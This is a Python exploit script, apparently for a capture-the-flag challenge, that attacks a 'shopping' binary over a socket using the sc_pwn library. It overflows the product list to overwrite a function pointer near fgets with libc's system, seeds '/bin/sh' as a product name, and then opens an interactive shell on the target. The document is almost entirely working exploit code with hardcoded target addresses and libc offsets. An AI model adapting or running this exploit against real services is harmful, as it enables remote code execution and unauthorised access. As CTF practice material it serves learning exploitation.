#!/usr/bin/env python
# https://github.com/shift-crops/sc_pwn/blob/master/sc_pwn.py
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',      local   = {'host':'192.168.75.133','port':8080}, \
                            remote  = {'host':'10.71.1.5','port':27025})
env.set_item('libc',        local   = 'D:\CTF\FILES\libc-2.19.so_local', \
                            remote  = '../libc-2.19.so_remote')
env.set_item('libc_base',   local   = 0xf7e11000, \
                            remote  = 0xf7e21000)
env.select()

binf = ELF('shopping')
libc = ELF(env.libc, base=env.libc_base)

addr_plt_fgets  = binf.plt('fgets')

addr_libc_system= libc.function('system')

#==========
def attack(cmn):
    pcp = 13
    pcc = 5

    sp = shopping(cmn)
    
    sp.add_product(1,'/bin/sh\0')
    for i in range(pcp-1):
        sp.add_product(0,'')

    for i in range(pcc):
        sp.add_cart(i, 1)

    for i in range(0x80-pcp):
        sp.add_product(0,'')

    sp.add_product(1,pack_32(addr_libc_system)+pack_32(addr_plt_fgets+6))
    sp.reset_product()

class shopping:
    def __init__(self, cmn):
        self.cmn = cmn
        self.mode = None
        self.SHOP = 1
        self.CUSTOMER = 2

    def change_mode(self, md):
        if self.mode != md:
            if self.mode is not None:
                self.cmn.read_until(': ')
                self.cmn.sendln('0')
            
            cmn.read_until(': ')
            cmn.sendln(str(md))
            self.mode = md
            
        
    def add_product(self, price, name):
        self.change_mode(self.SHOP)
        self.cmn.read_until(': ')
        self.cmn.sendln('1')
        self.cmn.read_until('>>')
        self.cmn.sendln(str(price))
        if price:
            self.cmn.read_until('>>')
            self.cmn.sendln(name)

    def reset_product(self):
        self.change_mode(self.SHOP)
        self.cmn.read_until(': ')
        self.cmn.sendln('3')

    def add_cart(self, id, c):
        self.change_mode(self.CUSTOMER)
        self.cmn.read_until(': ')
        self.cmn.sendln('1')
        self.cmn.read_until('>>')
        self.cmn.sendln(str(id))
        self.cmn.read_until('>>')
        self.cmn.sendln(str(c))  

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    del(cmn)
    
#==========
